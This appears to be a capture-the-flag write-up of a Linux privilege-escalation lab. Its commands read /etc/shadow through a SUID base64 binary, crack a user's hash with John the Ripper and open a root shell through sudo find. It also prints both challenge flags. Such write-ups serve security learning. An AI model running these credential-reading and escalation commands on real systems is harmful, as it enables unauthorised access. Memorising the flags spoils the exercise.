# Linux Privilege Escalation Writeup

## FLAG 1

After receiving the SSH credentials for user `leonard`, I logged into the target machine.

### Initial Enumeration

- Checked user identity:
![2025-04-30_14-41](https://github.com/user-attachments/assets/841bccd3-d1da-47b7-8bb2-87e5b49cc5dd)

  ```bash
  whoami
  ```
  Output: `leonard`

- Checked sudo permissions:
  ```bash
  sudo -l
  ```
  Output: User `leonard` cannot run sudo.

- Checked kernel version:
![2025-04-30_14-42](https://github.com/user-attachments/assets/e1585fa5-7c03-466f-bb94-5d570d9e56cd)

  ```bash
  uname -a
  ```
  Output showed kernel version `3.10` (possible CentOS SUID PIE LFI, but this was not pursued).

- Searched for SUID binaries:
![base64](https://github.com/user-attachments/assets/2f022ead-713b-4599-92fe-bf1f61274cc5)

  ```bash
  find / -type f -perm -04000 2>/dev/null
  ```
  Found: `base64` is available as a SUID binary and executable as root.

### Exploiting SUID Base64

- Exported the shadow file path:
![2025-04-30_14-48](https://github.com/user-attachments/assets/e0e588f8-3d12-4a36-9ee3-e65fd2825c25)
![2025-04-30_14-48_1](https://github.com/user-attachments/assets/cf77ff48-dea8-4620-af04-d7450cc4ebe1)

  ```bash
  export shadows="/etc/shadow"
  ```

- Encoded and decoded to retrieve password hashes:
  ```bash
  base64 $shadows | base64 -d
  ```
  This revealed password hashes for `root`, `missy`, and `leonard`.

- Verified home directories:
![2025-04-30_17-48](https://github.com/user-attachments/assets/d8761082-8faa-46ca-bc95-90b8689406a3)

  ```bash
  ls /home
  ```
  Output: `rootflag`, `missy`, and `leonard`

- Saved missy's hash and cracked it using John the Ripper:
![2025-04-30_14-53](https://github.com/user-attachments/assets/25926e87-aa26-43be-be05-a416523b8c71)

  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt missy.txt
  ```
  Cracked password: `Password1`

### Privilege Escalation to Missy

- Logged in via SSH using missy's credentials.

- Checked sudo permissions:
![2025-04-30_14-55](https://github.com/user-attachments/assets/02613642-6a09-4c2b-81a0-f42dc8544f4a)

  ```bash
  sudo -l
  ```
  Output: `missy` can run `find` as sudo.

- Searched for flag1 using find:
![flag1](https://github.com/user-attachments/assets/d02fab7b-156e-4aaf-b0ef-643d7e50187f)

  ```bash
  find / -type f -name flag1.txt 2>/dev/null
  ```
  Output: `/home/missy/Documents/flag1.txt`

  Flag: `THM-42828719920544` 

## FLAG 2

After obtaining `flag1.txt`, I proceeded to escalate privileges using the `find` command, which `missy` is allowed to run as `sudo`.

### Exploiting `find` via GTFObins

- From [GTFOBins](https://gtfobins.github.io/gtfobins/find/), we know that the following command can be used to escalate to a root shell:
![2025-04-30_17-46](https://github.com/user-attachments/assets/96f072ed-fed0-44c7-b3c4-766ebc051e11)

```bash
sudo find . -exec /bin/sh -p \; -quit
```

This command starts a root shell due to the `-p` option preserving privileges.

### Obtaining the Final Flag

Once in the root shell:
![2025-04-30_17-47](https://github.com/user-attachments/assets/84d0ec8e-71a4-4789-8d55-42fe08f21cab)

- Navigated to the `rootflag` directory:
  ```bash
  cd ../rootflag
  ```

- Read the final flag:
  ```bash
  cat flag2.txt
  ```

  Flag: `THM-168824782390238` 

This completed the privilege escalation challenge and retrieved `flag2.txt`.

## Conclusion

This challenge provided a solid walkthrough of Linux privilege escalation techniques, particularly:

- Leveraging SUID binaries like `base64` for accessing restricted files
- Password cracking using John the Ripper
- Gaining root access by exploiting misconfigured `sudo` permissions on binaries such as `find`

Overall, it was a hands-on exercise that emphasized the importance of proper binary permissions and the dangers of insecure privilege delegation on Linux systems.
